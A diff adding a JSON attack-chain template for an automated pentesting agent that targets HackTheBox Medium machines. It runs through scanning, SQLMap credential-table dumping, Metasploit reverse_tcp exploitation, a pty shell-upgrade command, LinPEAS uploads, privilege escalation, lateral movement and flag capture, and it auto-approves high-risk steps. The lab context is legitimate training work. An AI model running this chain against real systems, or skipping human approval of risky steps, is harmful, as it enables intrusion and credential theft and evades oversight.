@@ -1,0 +1,225 @@
+{
+  "template_id": "htb_medium",
+  "name": "HTB Medium Machine — Extended Attack Sequence",
+  "description": "Automated attack chain for HackTheBox Medium-rated machines. Extends the Easy template with LDAP enumeration, CMS-specific attacks, SQLMap injection testing, lateral movement, and advanced privilege escalation.",
+  "version": "1.0.0",
+  "auto_approve_risk_level": "high",
+  "phases": [
+    {
+      "phase": "recon",
+      "name": "Full Port Scan",
+      "tool": "naabu",
+      "params": {
+        "ports": "all",
+        "service_detection": true,
+        "aggressive_timing": true
+      },
+      "on_failure": "continue",
+      "description": "Full TCP port scan (1-65535) with service/version detection."
+    },
+    {
+      "phase": "recon",
+      "name": "LDAP / Active Directory Enumeration",
+      "tool": "metasploit",
+      "params": {
+        "auxiliary_modules": [
+          "auxiliary/scanner/ldap/ldap_login",
+          "auxiliary/gather/ldap_query"
+        ],
+        "anon_bind": true
+      },
+      "condition": "port_389_or_636_open",
+      "on_failure": "continue",
+      "description": "Enumerate LDAP/AD if ports 389/636 are open: users, groups, domain info."
+    },
+    {
+      "phase": "recon",
+      "name": "Web Discovery (ffuf — Extended)",
+      "tool": "ffuf",
+      "params": {
+        "wordlist": "raft-medium",
+        "extensions": ["php", "asp", "aspx", "html", "txt", "bak", "old", "zip", "gz", "conf", "config"],
+        "status_codes": [200, 201, 301, 302, 403, 500],
+        "rate_limit": 80,
+        "follow_redirects": true,
+        "vhost_fuzzing": true
+      },
+      "condition": "http_ports_found",
+      "on_failure": "continue",
+      "description": "Deep directory/file brute-force using raft-medium wordlist with extra extensions."
+    },
+    {
+      "phase": "recon",
+      "name": "CMS Detection & Enumeration",
+      "tool": "cms_scan",
+      "params": {
+        "cms_types": ["wordpress", "drupal", "joomla", "magento"],
+        "enumerate": ["users", "plugins", "themes", "versions"],
+        "brute_force_users": false
+      },
+      "condition": "cms_detected",
+      "on_failure": "continue",
+      "description": "Detect and enumerate CMS platforms found in web discovery."
+    },
+    {
+      "phase": "vuln_discovery",
+      "name": "Nuclei Vulnerability Scan (Comprehensive)",
+      "tool": "nuclei",
+      "params": {
+        "severity": ["critical", "high", "medium", "low"],
+        "templates": ["cve", "sqli", "xss", "rce", "lfi", "ssrf", "ssti", "xxe", "upload", "auth"],
+        "rate_limit": 30,
+        "concurrency": 10
+      },
+      "on_failure": "continue",
+      "description": "Comprehensive vulnerability scan including SSTI, XXE, file upload, auth bypass."
+    },
+    {
+      "phase": "vuln_discovery",
+      "name": "SQL Injection Testing (SQLMap)",
+      "tool": "sqlmap",
+      "params": {
+        "level": 3,
+        "risk": 2,
+        "technique": ["B", "E", "U", "S", "T"],
+        "dump_on_success": true,
+        "tables_to_dump": ["users", "accounts", "credentials"],
+        "random_agent": true
+      },
+      "condition": "forms_or_params_found",
+      "on_failure": "continue",
+      "description": "Test discovered forms and parameters for SQL injection; dump credential tables on success."
+    },
+    {
+      "phase": "exploitation",
+      "name": "CVE Exploitation — Attempt 1 (Top Candidate)",
+      "tool": "metasploit",
+      "params": {
+        "lport": 4444,
+        "payload_preference": ["meterpreter/reverse_tcp", "cmd/unix/interact"],
+        "timeout": 90
+      },
+      "on_failure": "next_candidate",
+      "retry": {
+        "max_attempts": 3,
+        "backoff_seconds": 10
+      },
+      "description": "Attempt exploitation with highest-ranked exploit candidate."
+    },
+    {
+      "phase": "exploitation",
+      "name": "CVE Exploitation — Fallback (Next Candidates)",
+      "tool": "metasploit",
+      "params": {
+        "lport": 4445,
+        "payload_preference": ["meterpreter/reverse_tcp", "python/meterpreter/reverse_tcp"],
+        "timeout": 90,
+        "fallback_mode": true
+      },
+      "on_failure": "continue",
+      "retry": {
+        "max_attempts": 5,
+        "backoff_seconds": 10
+      },
+      "description": "Try remaining exploit candidates if primary attempt fails."
+    },
+    {
+      "phase": "post_exploitation",
+      "name": "Session Upgrade",
+      "tool": "metasploit",
+      "params": {
+        "upgrade_to_meterpreter": true,
+        "pty_spawn": "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'",
+        "stabilize_shell": true,
+        "stty_config": "stty raw -echo; fg"
+      },
+      "on_failure": "continue",
+      "description": "Upgrade plain shell to Meterpreter; stabilize TTY for interactive use."
+    },
+    {
+      "phase": "post_exploitation",
+      "name": "System Enumeration (Extended)",
+      "tool": "metasploit",
+      "params": {
+        "commands": ["sysinfo", "getuid", "id", "whoami", "hostname", "ifconfig", "route", "arp -n", "netstat -tunlp"]
+      },
+      "on_failure": "continue",
+      "description": "Extended enumeration: OS, user context, network config, ARP cache, listening ports."
+    },
+    {
+      "phase": "post_exploitation",
+      "name": "LinPEAS / WinPEAS Privilege Escalation",
+      "tool": "post_exploit",
+      "params": {
+        "linux_script": "linpeas.sh",
+        "windows_script": "winPEAS.exe",
+        "upload_path": "/tmp/",
+        "timeout": 120
+      },
+      "on_failure": "continue",
+      "description": "Upload and run LinPEAS/WinPEAS for automated privilege escalation enumeration."
+    },
+    {
+      "phase": "post_exploitation",
+      "name": "Privilege Escalation Attempt",
+      "tool": "metasploit",
+      "params": {
+        "try_getsystem": true,
+        "suggest_modules": true,
+        "auto_run_local_exploit": false
+      },
+      "on_failure": "continue",
+      "description": "Attempt privilege escalation via getsystem and suggested local exploit modules."
+    },
+    {
+      "phase": "post_exploitation",
+      "name": "Lateral Movement Check",
+      "tool": "metasploit",
+      "params": {
+        "scan_internal_network": true,
+        "pivot_port_scan": "top-100",
+        "arp_scan": true
+      },
+      "condition": "internal_network_detected",
+      "on_failure": "continue",
+      "description": "If internal network is found, scan for additional hosts and attempt lateral movement."
+    },
+    {
+      "phase": "post_exploitation",
+      "name": "Flag Capture",
+      "tool": "flag_capture",
+      "params": {
+        "paths": [
+          "/root/root.txt",
+          "/root/flag.txt",
+          "/root/proof.txt",
+          "/home/**/user.txt",
+          "/home/**/flag.txt",
+          "C:\\Users\\Administrator\\Desktop\\root.txt",
+          "C:\\Users\\Administrator\\Desktop\\proof.txt",
+          "C:\\Users\\*\\Desktop\\user.txt"
+        ],
+        "verify_md5": true,
+        "store_neo4j": true,
+        "search_entire_fs": false
+      },
+      "on_failure": "continue",
+      "description": "Capture CTF-style flags from standard and non-standard locations."
+    }
+  ],
+  "target_profile": {
+    "difficulty": "medium",
+    "platform": ["linux", "windows"],
+    "typical_services": ["ssh", "http", "https", "smb", "ldap", "rdp", "mssql", "mysql"],
+    "success_criteria": {
+      "min_flags": 1,
+      "target_flags": 2,
+      "target_flag_names": ["user.txt", "root.txt"]
+    }
+  },
+  "metadata": {
+    "created": "2026-03-13",
+    "author": "UniVex — Betterment Plan Week 11",
+    "retired_machines_tested": ["Academy", "Forest", "Monteverde", "Netmon", "Resolute"]
+  }
+}
